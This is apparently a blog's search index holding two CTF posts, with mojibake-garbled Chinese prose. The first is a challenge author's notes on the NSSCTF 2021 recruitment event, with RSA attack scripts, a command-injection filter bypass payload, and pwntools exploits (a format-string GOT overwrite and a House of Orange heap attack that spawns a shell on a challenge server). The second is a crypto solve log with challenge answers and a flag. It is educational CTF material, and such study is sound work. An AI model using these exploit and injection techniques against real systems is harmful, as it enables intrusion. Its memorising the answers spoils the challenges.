<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>NSSCTF 2021 æ‹›æ–°å‡ºé¢˜ç¬”è®°</title>
    <url>/2021/10/06/NSSCTF%202021%20%E6%8B%9B%E6%96%B0%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/27.jpg" alt="pic"></p>
<span id="more"></span>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ˜¯æˆ‘ç¬¬äºŒæ¬¡ä¸ºå›¢é˜Ÿæ‹›æ–°èµ›å‡ºé¢˜ï¼Œè¿™æ¬¡ä¸€å¼€å§‹å¬xennyè€æ¿è¯´è¦æä¸ªæ ¡å¤–èµ›é“ï¼Œå¥½å®¶ä¼™ï¼Œè¿™æ¬¡æ‹›æ–°å››èˆäº”å…¥å°±æˆäº†ä¸€ä¸ªå°å‹çš„å…¬å¼€èµ›äº†ï¼Œå½“æ—¶æ­£åœ¨å¥—æ¨¡æ¿é¢˜çš„æ‰‹å¾®å¾®é¢¤æŠ–ï¼Œæœ‰é‚£ä¹ˆä¸€ç¬é—´åœ¨æƒ³è¦ä¸è¦æ•´ç‚¹æ´»ï¼Œä½†æƒ³åˆ°è¿™æ¯”èµ›æ˜¯é¢å‘æ–°ç”Ÿçš„æœ€ç»ˆè¿˜æ˜¯æ²¡æœ‰æ•´ï¼ˆä¸»è¦è¿˜æ˜¯èœï¼Œæ•´ä¸å‡ºæ¥ï¼‰</p>
<p>è¿™æ¬¡çš„é¢˜ç›®æˆ‘è´Ÿè´£çš„æ˜¯pwn1-5,ä»¥åŠå¯†ç å­¦æ–¹å‘çš„1-5ï¼ˆç°ä»£å¯†ç éƒ¨åˆ†ï¼‰, æœ¬æ¥ä¸€å¼€å§‹çš„æ—¶å€™æ˜¯æ²¡æœ‰æ‰“ç®—å‡ºpwné¢˜çš„ï¼Œå› ä¸ºæ–°ç”Ÿå¤§éƒ¨åˆ†éƒ½æ˜¯è¿˜æ²¡æœ‰æ¥è§¦è¿‡CTFçš„å°ç™½ï¼Œæˆ‘è§‰å¾—æ–°ç”Ÿé€šè¿‡è‡ªå­¦æŠŠç¯å¢ƒæ­å»ºå¥½å°±å·®ä¸å¤šäº†ï¼Œæœ€ç»ˆè¿˜æ˜¯è¿«äºwdljtè€æ¿çš„æ·«å¨å‡ºäº†äº”ä¸ªç™½ç»™pwnã€‚</p>
<h2 id="å‡ºé¢˜æ€è·¯"><a href="#å‡ºé¢˜æ€è·¯" class="headerlink" title="å‡ºé¢˜æ€è·¯"></a>å‡ºé¢˜æ€è·¯</h2><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p>å›¢é˜Ÿé‡Œé¢æç°ä»£å¯†ç çš„å°±ä¸¤ä¸ªäººï¼Œå¦å¤–ä¸€ä¸ªå¸ˆå‚…è¦åŠ ç­å‡ºmiscï¼Œç°ä»£å¯†ç å°±åªæœ‰æˆ‘æ¥ï¼Œåˆå› ä¸ºèµ¶ç€ç¬¬äºŒå¤©ä¸Šé¢˜ï¼Œå°±ç›´æ¥æ‘†çƒ‚æ°´äº†5ä¸ªé¢˜</p>
<p>è¿™äº”ä¸ªå¯†ç é¢˜éƒ½æ˜¯æ¨¡æ¿é¢˜ï¼Œæ”¹éƒ½ä¸å¸¦æ”¹çš„ï¼Œè¿™äº”ä¸ªå¯†ç é¢˜å‡ºé¢˜åŠ èµ·æ¥ä¹Ÿå°±èŠ±äº†ä¸åˆ°20åˆ†é’Ÿï¼Œéš¾åº¦éƒ½ä¸å¤§ï¼Œæ¯ä¸ªé¢˜åº”è¯¥éƒ½èƒ½ç™¾åº¦åˆ°åŸé¢˜ã€‚</p>
<h4 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h4><p>ç»™äº†c1,c2,nï¼Œä»¥åŠe1<em>e2 = 3087,åˆå› ä¸º3087 = 3</em>3<em>3</em>7*7 å¤§æ¦‚ç‡æƒ³åˆ°æ¨¡ä¸äº’ç´ ï¼Œè§£é¢˜è„šæœ¬å¦‚ä¸‹<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_gong_N_def</span>(<span class="params">e1,e2,c1,c2,n</span>):</span></span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de</span>(<span class="params">c, e, n</span>):</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> k&lt;<span class="number">1000</span>:</span><br><span class="line">        mm = c + n*k</span><br><span class="line">        result, flag = gmpy2.iroot(mm, e)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == flag:</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,e1e2):</span><br><span class="line">    <span class="keyword">if</span> e1e2%e1==<span class="number">0</span>:</span><br><span class="line">        e2=e1e2//e1</span><br><span class="line">        c=rsa_gong_N_def(e1, e2, c1, c2, n)</span><br><span class="line">        e=gmpy2.gcd(e1,e2)</span><br><span class="line">        m1=de(c,e,n)</span><br><span class="line">        <span class="keyword">if</span> m1:</span><br><span class="line">            flag=long_to_bytes(<span class="built_in">int</span>(m1))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h4 id="crypro2"><a href="#crypro2" class="headerlink" title="crypro2"></a>crypro2</h4><p>ç®€å•çš„å…±æ¨¡æ”»å‡»</p>
<h4 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h4><p>ï¼Œ<br>è¿™ä¸ªé¢˜æ˜¯å»å¹´xennyè€æ¿åœ¨ç”µè¯é‡Œè€ƒè¿‡æˆ‘çš„ä¸€ä¸ªé¢˜ï¼Œå½“æ—¶æ²¡æœ‰æƒ³å‡ºæ¥ï¼Œè¿™æ¬¡æƒ³èµ·æ¥è¿™ä¸ªé¢˜å°±å‡ºåˆ°äº†æ‹›æ–°èµ›é‡Œï¼Œå‡ºå®Œä¹‹åå®¡é¢˜çš„æ—¶å€™æ‰å‘ç°è‡ªå·±ä¸ä¼šåšxsï¼Œè¿˜æ˜¯å¤ªèœã€‚åæ¥<a href="https://space.bilibili.com/317479700?from=search&amp;seid=4162979929301748482&amp;spm_id_from=333.337.0.0">é£äºŒè¥¿</a>å¸ˆå‚…ç»™æˆ‘è¯´æ˜¯NPUCTF2020çš„åŸé¢˜ï¼Œè¿™æ‰å»å­¦äº†ä¸€æ³¢ã€‚<br>è¿™é‡Œå°±ç›´æ¥è´´ä¸€ä¸‹å¤§ä½¬çš„åšå®¢ï¼š<a href="https://www.cnblogs.com/vict0r/p/13292511.html">https://www.cnblogs.com/vict0r/p/13292511.html</a><br>è§£é¢˜è„šæœ¬<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c1=flag1</span><br><span class="line">c2=flag2</span><br><span class="line">a = c1+c2</span><br><span class="line">b = c1*c2</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt;=Zmod(n)[]</span><br><span class="line">f = x^<span class="number">2</span> - a*x +b</span><br><span class="line">f.small_roots(X=<span class="number">2</span>^<span class="number">400</span>)</span><br></pre></td></tr></table></figure></p>
<h4 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h4><p>ç”±äºq = nextPrime(p) , æ‰€ä»¥å¯ä»¥yafuç›´æ¥åˆ†è§£n , ç›´æ¥æ‹¿ä¸‹</p>
<h4 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h4><p>ä½e , e = 3</p>
<h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h4><p>è¿‡æ»¤äº†ä¸€èˆ¬æ‹¿æ¥è¯»æ–‡ä»¶çš„ä¸€äº›å‘½ä»¤ä»¥åŠç©ºæ ¼</p>
<p>payload<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tac$IFS<span class="variable">$9flag</span></span><br></pre></td></tr></table></figure></p>
<h4 id="pwn2-4"><a href="#pwn2-4" class="headerlink" title="pwn2~4"></a>pwn2~4</h4><p>è¿™ä¸‰ä¸ªé¢˜éƒ½æ˜¯ã€ŠCTFä»0åˆ°1ã€‹ä¸Šçš„æ¨¡æ¿ï¼Œç›´æ¥ç…§ç€æ‰“å°±è¡Œ<br>pwn2ï¼šä¿®æ”¹è¿”å›åœ°å€ä¸ºgift<br>pwn3ï¼šputsæ³„éœ²libcåœ°å€ï¼Œret2libc<br>pwn4: ç”±äºå¼€äº†pie,æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²ç¨‹åºåœ°å€å’Œlibcåœ°å€ï¼Œç„¶åå†åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„åœ°å€å†™</p>
<p>å…³äºpwn4åœ¨æµ‹çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªæœ‰æ„æ€çš„ç°è±¡<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;pwn4&#x27;</span>)</span><br><span class="line">elf =  ELF(<span class="string">&quot;pwn4&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;%17$p%21$p&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-elf.sym[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x20840</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">printf = elf_base+elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf:system&#125;)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<p>ç”¨è¿™ä¸ªexpå¯ä»¥æ‹¿åˆ°ä¸€ä¸ªshçš„shell,ä½†ä¸æ˜¯æ¯ä¸€æ¬¡éƒ½èƒ½æˆåŠŸï¼Œç”±äºæˆåŠŸç‡å¤ªä½ï¼Œä¹Ÿæ²¡æœ‰åŠ¨æ€è°ƒè¯•ï¼Œå¸Œæœ›æœ‰çŸ¥é“åŸå› çš„å¤§ä½¬å¯ä»¥ä¸ºæˆ‘è§£æƒ‘ã€‚ç£•å¤´å•¦ï¼Œç °ç °ç °ã€‚<br><img src="http://static.zybuluo.com/hgggg/kgn1pamo0ny94c70oeuysz33/Cache_-36b9d8e9cc4ee054..jpg" alt="Cache_-36b9d8e9cc4ee054..jpg-4kB"></p>
<h4 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h4><p>è¿™ä¸ªé¢˜å‰æ®µæ—¶é—´å­¦house of orangeå­¦åˆ°çš„ä¸€ä¸ªé¢˜ï¼Œç„¶åå¥—äº†ä¸ªbase64ç¼–è¯‘ç è¡¨çš„éªŒè¯ã€‚</p>
<p>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²åœ°å€ï¼Œç„¶ååˆ©ç”¨getsæº¢å‡ºä¿®æ”¹top chunkå¤§å°ï¼Œç”³è¯·è¶…è¿‡top chunkå¤§å°çš„å—å¾—åˆ°unsortedbin,æœ€åä¼ªé€ _IO_FILEç»“æ„ä½“ï¼Œä¿®æ”¹è™šè¡¨æŒ‡é’ˆæ¥get shell</p>
<p>exp<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28062</span>)</span><br><span class="line">elf =  ELF(<span class="string">&quot;pwn5&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;word: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;username = &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;NSSCTF&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;password = &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;NSSCTF&#123;b@se_xx_64&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;word: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;0x18&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xfe1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;word: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;0x1000&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;%9$p%3$p&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attch(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x21010</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0xf73c0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+ p64(<span class="number">0x60</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1 += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(heap_base + <span class="number">0x508</span>)</span><br><span class="line">payload1 += p64(<span class="number">1</span>)*<span class="number">2</span></span><br><span class="line">payload1 += p64(system_addr)</span><br><span class="line">payload = payload+payload1</span><br><span class="line">add(<span class="number">0x400</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<p>åæ¥çœ‹å¸ˆå‚…ä»¬çš„è®¨è®ºï¼Œæ‰å‘ç°æˆ‘è¢«éé¢„æœŸäº†ï¼Œæœ‰çš„å¸ˆå‚…æ‰¾åœ°æ–¹æ‰“çš„rop,æœ‰çš„å¸ˆå‚…æ‰“æŠŠæ ˆè¿ç§»åˆ°å †ä¸Šï¼Œè¿˜æœ‰å¸ˆè°ƒ malloc reallocè°ƒé€šäº†ï¼Œ æœç„¶æˆ‘è¿˜æ˜¯å¤ªèœäº†ã€‚ç»™å„ä½pwnğŸ‘´ç£•å¤´ğŸŒ¶ï¼Œç °ç °ç °<br><img src="http://static.zybuluo.com/hgggg/kgn1pamo0ny94c70oeuysz33/Cache_-36b9d8e9cc4ee054..jpg" alt="Cache_-36b9d8e9cc4ee054..jpg-4kB"></p>
<h3 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h3><p>è™½ç„¶ï¼Œè¿™æ¬¡æ ¡å¤–èµ›é“è¢«æ‰“çš„å¾ˆæƒ¨ï¼Œä½†æ˜¯æ ¡å†…çš„äººåŸºæœ¬ä¸Šæ²¡äººåšpwnï¼Œå¸Œæœ›ä¸è¦æŠŠæ–°äººåŠé€€å§ï¼Œè¦æ˜¯å†æ²¡äººå­¦pwn,é˜Ÿé‡Œpwnæ–¹å‘å°±çœŸåªèƒ½æ‘†çƒ‚äº†ï¼Œå‡ºå»å›½èµ›çœ‹åˆ«äººçš„é˜Ÿä¸€ä¸ªé˜Ÿ3ä¸ªpwnğŸ‘´ï¼Œè€Œç°åœ¨é˜Ÿé‡Œå°±åªæœ‰æˆ‘ä¸€ä¸ªäººæpwnçœŸçš„é¡¶ä¸ä½ï¼Œå¸Œæœ›è¿™æ¬¡æ‹›æ–°èƒ½å¸æ”¶äº›æ–°é²œçš„è¡€æ¶²å§ã€‚ä¹Ÿå¸Œæœ›å›¢é˜Ÿèƒ½è¶Šé«˜è¶Šå¥½ã€‚</p>
]]></content>
      <categories>
        <category>å…¶ä»–</category>
      </categories>
      <tags>
        <tag>ç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF crypto åˆ·é¢˜è®°å½•(æŒç»­æ›´æ–°)</title>
    <url>/2021/10/08/NSSCTF%20crypto%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p><img src="https://gitee.com/Nss-harukii/images/raw/master/28.jpg" alt="pic"></p>
<span id="more"></span>
<p>è¿™æ˜¯ä¸€ä¸ªè®°å½•åœ¨NSSCTFå¹³å°ä¸Šåˆ·cryptoé¢˜çš„åšå®¢ï¼Œé¢˜ç›®é¡ºåºæŒ‰ç…§åˆ·é¢˜çš„å…ˆåé¡ºåº</p>
<h2 id="ç¾ŠåŸæ¯-2021-Bigrsa"><a class="header-anchor" href="#ç¾ŠåŸæ¯-2021-Bigrsa">Â¶</a>[ç¾ŠåŸæ¯ 2021]Bigrsa</h2>
<h3 id="é¢˜ç›®"><a class="header-anchor" href="#é¢˜ç›®">Â¶</a>é¢˜ç›®</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">c = <span class="built_in">pow</span>(c, e, n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = %d&quot;</span> % c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line"><span class="comment"># c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">Â¶</a>åˆ†æ</h3>
<p>n1 å’Œ n2 å­˜åœ¨å…¬å› æ•°</p>
<h3 id="exp"><a class="header-anchor" href="#exp">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#c = pow(m, e, n1)</span></span><br><span class="line"><span class="comment">#c = pow(c, e, n2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># output</span></span><br><span class="line">c = <span class="number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line"></span><br><span class="line">p = gcd(n1,n2)</span><br><span class="line"></span><br><span class="line">q1 = n1 // p</span><br><span class="line">q2 = n2 // p</span><br><span class="line"></span><br><span class="line">phi1 = (p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">phi2 = (p-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d1 = invert(e,phi1)</span><br><span class="line">d2 = invert(e,phi2)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(c,d2,n2)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d1,n1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h2 id="SWPU-2020-happy"><a class="header-anchor" href="#SWPU-2020-happy">Â¶</a>[SWPU 2020]happy</h2>
<h3 id="é¢˜ç›®-v2"><a class="header-anchor" href="#é¢˜ç›®-v2">Â¶</a>é¢˜ç›®</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&#x27;c=&#x27;, &#x27;0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9eL&#x27;)</span><br><span class="line">(&#x27;e=&#x27;, &#x27;0x872a335&#x27;)</span><br><span class="line">#q + q*p^3 =1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span><br><span class="line">#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span><br></pre></td></tr></table></figure>
<h3 id="åˆ†æ-v2"><a class="header-anchor" href="#åˆ†æ-v2">Â¶</a>åˆ†æ</h3>
<p>$hint1 = q + qp^3 = (1+p^3)q = q(1+p)(p^2-p+1)$<br>
$hint2 = qp + qp^2 = q(1+p)p$<br>
gcd(hint1,hint2) = q(1+p)<br>
p = hint2 / q(1+p)</p>
<h3 id="exp-v2"><a class="header-anchor" href="#exp-v2">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">c=<span class="number">0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9e</span></span><br><span class="line">e=<span class="number">0x872a335</span></span><br><span class="line"><span class="comment">#q + q*p^3 =1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span></span><br><span class="line"><span class="comment">#qp + q *p^2 = 1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hint1 = <span class="number">1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586</span></span><br><span class="line">hint2 = <span class="number">1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594</span></span><br><span class="line"></span><br><span class="line">gift = gcd(hint1,hint2)</span><br><span class="line"></span><br><span class="line">p = hint2//gift</span><br><span class="line">q = gift // (p+<span class="number">1</span>)</span><br><span class="line">n= p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = invert(e,phi)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>
<h2 id="é¹¤åŸæ¯-2021-A-CRYPTO"><a class="header-anchor" href="#é¹¤åŸæ¯-2021-A-CRYPTO">Â¶</a>[é¹¤åŸæ¯ 2021]A_CRYPTO</h2>
<h3 id="é¢˜ç›®-v3"><a class="header-anchor" href="#é¢˜ç›®-v3">Â¶</a>é¢˜ç›®</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4O52594551344P55494R4P48553353424O4234474O33544S4S42545549574O554O4649474S364O324N5N4P5555594P4P4N564456513554534R563244474Q4N554R4533554S53544N4R4Q5957365443534N4Q3458534Q4O584O56515736323248</span><br></pre></td></tr></table></figure>
<h3 id="é¢˜è§£"><a class="header-anchor" href="#é¢˜è§£">Â¶</a>é¢˜è§£</h3>
<p>ciphey ä¸€æŠŠæ¢­<br>
ROT13-&gt;base16-&gt;base32-&gt;base64-&gt;base85</p>
<p>flag:NSSCTF{W0w_y0u_c4n_rea11y_enc0d1ng!}</p>
<h2 id="é¹¤åŸæ¯-2021-easy-crypto"><a class="header-anchor" href="#é¹¤åŸæ¯-2021-easy-crypto">Â¶</a>[é¹¤åŸæ¯ 2021]easy_crypto</h2>
<h3 id="é¢˜ç›®-v4"><a class="header-anchor" href="#é¢˜ç›®-v4">Â¶</a>é¢˜ç›®</h3>
